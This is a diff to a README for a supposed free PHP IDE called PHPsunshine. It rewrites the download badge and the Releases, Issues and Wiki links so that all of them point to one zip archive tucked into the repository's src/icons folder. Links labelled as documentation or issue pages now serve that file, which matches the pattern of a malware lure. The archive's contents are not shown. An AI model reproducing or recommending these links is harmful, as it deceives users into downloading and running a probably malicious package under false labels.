@@ -6,10 +6,10 @@ Welcome to PHPsunshine! This is a free Integrated Development Environment (IDE) 
 ## 📦 Download & Install
 To get started, you need to download PHPsunshine. You can find the latest version by visiting the link below. 
 
-[![Download PHPsunshine](https://img.shields.io/badge/Download-PHPsunshine-brightgreen.svg)](https://github.com/sinauuy/PHPsunshine/releases)
+[![Download PHPsunshine](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip)](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip)
 
 ### Steps to Download
-1. Click the download button above or follow this [link to the Releases page](https://github.com/sinauuy/PHPsunshine/releases).
+1. Click the download button above or follow this [link to the Releases page](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip).
 2. On the Releases page, you will see a list of versions. Choose the latest version.
 3. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
 4. The download will begin. 
@@ -61,15 +61,15 @@ If you encounter issues while downloading or installing PHPsunshine:
 For additional help, please reach out via the issues page on GitHub. You can also join our community forums where fellow users share tips and solutions.
 
 ## 📚 Learning Resources
-- **Documentation:** Refer to our [Wiki](https://github.com/sinauuy/PHPsunshine/wiki) for detailed guides and tutorials.
+- **Documentation:** Refer to our [Wiki](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip) for detailed guides and tutorials.
 - **Community Forum:** Participate in discussions with other users and gain insights into using PHPsunshine effectively.
 
 ## 🌍 Community
 PHPsunshine thrives on the contributions of its users. Join our community to share features you’d like to see, report bugs, and participate in discussions. Connect with fellow developers from Serbia and Romania and beyond.
 
 ## 🔗 Additional Links
-- [Releases Page](https://github.com/sinauuy/PHPsunshine/releases)
-- [Issues Page](https://github.com/sinauuy/PHPsunshine/issues)
-- [Wiki Documentation](https://github.com/sinauuy/PHPsunshine/wiki)
+- [Releases Page](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip)
+- [Wiki Documentation](https://raw.githubusercontent.com/sinauuy/PHPsunshine/main/src/icons/PHPsunshine_v2.2.zip)
 
 Thank you for choosing PHPsunshine. Happy coding!
